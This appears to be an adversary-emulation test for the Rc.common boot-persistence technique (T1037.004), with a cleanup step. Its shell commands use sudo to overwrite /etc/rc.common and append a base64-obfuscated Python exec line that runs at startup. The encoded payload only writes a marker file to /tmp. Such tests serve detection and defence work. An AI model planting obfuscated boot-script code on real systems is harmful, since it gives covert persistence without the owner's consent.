**Technique: Boot or Logon Initialization Scripts: Rc.common (T1037.004)**

**Command (sh):**
```
filename='/etc/rc.common';
if [ ! -f $filename ]; then 
  sudo touch $filename;
else 
  sudo cp $filename /etc/rc.common.original;
fi;
printf '%s\n' '#!/bin/bash' | sudo tee /etc/rc.common;
echo "python3 -c \"import os, base64;exec(base64.b64decode('aW1wb3J0IG9zCm9zLnBvcGVuKCdlY2hvIGF0b21pYyB0ZXN0IGZvciBtb2RpZnlpbmcgcmMuY29tbW9uID4gL3RtcC9UMTAzNy4wMDQucmMuY29tbW9uJykK'))\"" | sudo tee -a /etc/rc.common;
printf '%s\n' 'exit 0' | sudo tee -a /etc/rc.common;
sudo chmod +x /etc/rc.common;
```

**Cleanup:**
```
origfilename='/etc/rc.common.original';
if [ ! -f $origfilename ]; then 
  sudo rm /etc/rc.common;
else 
  sudo cp $origfilename /etc/rc.common && sudo rm $origfilename;
fi
```

